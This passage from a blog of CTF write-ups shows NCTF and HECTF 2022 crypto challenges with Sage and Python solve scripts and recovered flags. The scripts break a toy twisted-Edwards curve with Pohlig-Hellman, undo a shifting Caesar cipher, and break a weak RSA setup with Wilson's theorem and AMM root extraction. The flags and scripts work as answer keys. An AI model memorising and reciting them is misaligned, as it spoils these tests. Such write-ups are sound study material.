class="comment">#nctf&#123;Th1s_N_May_n0t_s0@o0@@_secur3&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="superecc"><a href="#superecc" class="headerlink" title="superecc"></a>superecc</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>考查的是Twisted Edward Curve</p>
<p>题⽬定义了⼀个循环群上的点加法，搜索可以发现是Twisted Edward Curve</p>
<p><img src="/2023/03/14/2022NCTF/WAGZ2AYAFU.png" alt="img"></p>
<p>经过适当的变化可以将c消除掉，得到标准形式</p>
<p><img src="/2023/03/14/2022NCTF/SIGZ2AYAXQ.png" alt="img"></p>
<p>对于Twisted Edward Curve，可以转化为等价的Montgomery Curve</p>
<p><img src="/2023/03/14/2022NCTF/UMGZ2AYB44.png" alt="img"></p>
<p>Montgomery Curve的形式已经是Weierstrass形式的椭圆曲线，可以使⽤sage求解其阶，即求得了Twisted Edward Curve的阶寻找阶中的⼩素数因⼦，使⽤Pohlig Hellman + BSGS求解离散对数问题，得到flag的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">        self.INF = (<span class="number">0</span>, self.c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse_mod(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse_mod(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = self.INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_order</span>():</span><br><span class="line">    d = d * c^<span class="number">4</span> % p</span><br><span class="line">    A = <span class="number">2</span> * (a + d) * inverse_mod(a - d, p) % p</span><br><span class="line">    B = <span class="number">4</span> * inverse_mod(a - d, p) % p</span><br><span class="line">    a1 = <span class="number">0</span></span><br><span class="line">    a3 = <span class="number">0</span></span><br><span class="line">    a2 = A*B%p</span><br><span class="line">    a4 = B*B%p</span><br><span class="line">    a6 = <span class="number">0</span></span><br><span class="line">    E=EllipticCurve(GF(p),[a1,a2,a3,a4,a6])</span><br><span class="line">    np=E.cardinality()</span><br><span class="line">    <span class="keyword">return</span> ZZ(np)</span><br><span class="line"></span><br><span class="line">ecc = super_ecc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">L, R, sub_order, order</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.add(P, Q)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">P, x</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.mul(x % order, P)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">L, R, sub</span>):</span><br><span class="line">        L, R = mul(L, (order//sub)), mul(R, (order//sub))</span><br><span class="line"></span><br><span class="line">        m, dic = sqrt(sub).<span class="built_in">round</span>(), <span class="built_in">dict</span>()</span><br><span class="line">        ga = mul(L, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(m + <span class="number">1</span>)):</span><br><span class="line">            dic[<span class="built_in">str</span>(ga)], ga = i, add(ga, L)</span><br><span class="line">        gb = mul(L, (-m))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(sub//m + <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(R) <span class="keyword">in</span> dic:</span><br><span class="line">                sk = i*m + dic[<span class="built_in">str</span>(R)]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub&#125;</span> -&gt; <span class="subst">&#123;sk&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> ZZ(sk)</span><br><span class="line">            R = add(R, gb)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    sk = crt(</span><br><span class="line">        [BSGS(L, R, sub) <span class="keyword">for</span> sub <span class="keyword">in</span> sub_order],</span><br><span class="line">        sub_order</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># order = get_order()</span></span><br><span class="line">order = <span class="number">101194790049284589034264952247851014979635478581961323247248565451562534055248</span></span><br><span class="line">sub_order = [<span class="number">16</span>, <span class="number">113</span>, <span class="number">28921</span>, <span class="number">749971</span>, <span class="number">87374629</span>]</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = (<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,</span><br><span class="line">     <span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line"></span><br><span class="line">sk = Pohlig_Hellman(G, S, sub_order, order)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(sk))</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2022NCTF/" rel="tag">2022NCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-HECTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/HECTF/"
    >HECTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/HECTF/" class="article-date">
  <time datetime="2023-03-14T12:38:01.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="HECTF-2022"><a href="#HECTF-2022" class="headerlink" title="HECTF 2022"></a>HECTF 2022</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♭♫♭♭§‖♭∮♭♯♩‖♭♪‖♩♫‖♭‖♭‖§♭‖♩‖♬♫♭‖‖‖♬∮‖¶♩♭‖♪‖♬♯♭♯♪‖¶¶‖♬♭♭‖♪‖♬♫§=</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>先进行音符解密</p>
<p>然后利用变异凯撒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;EA&gt;N?s:WZgTdPYbMSaYg&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">k=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+k)</span><br><span class="line">    k = k + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#HECTF&#123;Caesar_is_fun&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mygenerate</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line">    q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line">    <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>第一步分先利用威尔逊定理求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">p = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 = <span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 = <span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mydecrypt</span>(<span class="params">A,B</span>):</span><br><span class="line">    ans=<span class="number">1</span></span><br><span class="line">    temp=gmpy2.powmod(-<span class="number">1</span>,<span class="number">1</span>,A)</span><br><span class="line">    <span class="comment">#print(temp)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B+<span class="number">1</span>,A):</span><br><span class="line">        ans=(ans*gmpy2.invert(i,A))%A</span><br><span class="line">    <span class="keyword">return</span> (ans*temp)%A</span><br><span class="line">q = sympy.nextprime(mydecrypt(p,g))</span><br><span class="line">n = p*q</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e2,phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m2)))</span><br><span class="line"><span class="comment">#b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后是e和phi_n不互素，用普通方法求不出来，所以利用AMM算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line">c = <span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">p = <span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">cp = c % p</span><br><span class="line"></span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line"><span class="built_in">print</span>(mps)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span 